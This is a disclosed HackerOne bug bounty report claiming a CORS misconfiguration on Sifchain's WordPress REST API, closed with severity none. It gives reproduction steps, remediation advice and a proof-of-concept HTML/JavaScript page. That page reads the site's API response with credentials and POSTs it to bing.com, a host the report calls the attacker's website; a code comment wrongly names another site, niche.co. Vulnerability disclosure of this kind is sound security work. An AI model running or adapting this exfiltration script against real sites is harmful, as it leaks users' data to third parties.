# CORS Misconfiguration Leads to Sensitive Exposure on  Sifchain main domain

## Report Details
- **Report ID**: 1188684
- **URL**: https://hackerone.com/reports/1188684
- **State**: Closed
- **Severity**: none
- **Submitted**: 2021-05-07T22:05:28.249Z
- **Disclosed**: 2021-06-10T15:01:24.132Z

## Reporter
- **Username**: emptymahbob
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: sifchain

## Vulnerability Information
## Summary:
Hello,
I know that isn't in the Scope But this The Only Way I can Report With And It Belongs to the Main Domain.

==At first please see all those references given below:==

##References:
https://hackerone.com/reports/768151
https://hackerone.com/reports/1167869
https://hackerone.com/reports/1170185

##Details:
It's possible to get information about the users registered (such as id, name, login name, etc.) without authentication in
WordPress via API.

## Steps To Reproduce:
+ Intercept this URL https://sifchain.finance/wp-json/ to Burp
+ Then add `Origin: http://bing.com` in request & forward the request
+ In response, you will able to see `Access-Control-Allow-Origin: http://bing.com`

> Simple Exploit given below:

```
<html>
<body>
<button type='button' onclick='cors()'>CORS</button>
<p id='demo'></p>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var a = this.responseText; // Sensitive data from niche.co about user account
document.getElementById("demo").innerHTML = a;
xhttp.open("POST", "http://bing.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("GET", "https://sifchain.finance/wp-json/", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>
```

==For better understanding please watch the POC Video.==

#POC Video:

{F1293211}


#Remediation:
There are 2 ways that it's possible to fix this problem.
==FIX 1== - It's possible to remove this access for anyone by changing the source code where when someone requests the Rest API and the server sends a 404 (Not Found) message for the user who made the request.

Reference: https://github.com/WP-API/WP-API/issues/2338

==FIX 2== - It's also possible to create a rewrite rule on .htaccess (if the webserver it's Apache) to redirect any request that contains restricted (eg.: "^.restroute=/wp/") to a Not Found (404) or a Default Page.

Regards,
@emptymahbob

## Impact

It's possible to get all the users registered on the system and create a brute force directed to these users.
Cross Misconfiguration -Leakage Sensitive Information.

## Attachments
- sifchain.finance_CORS.mp4
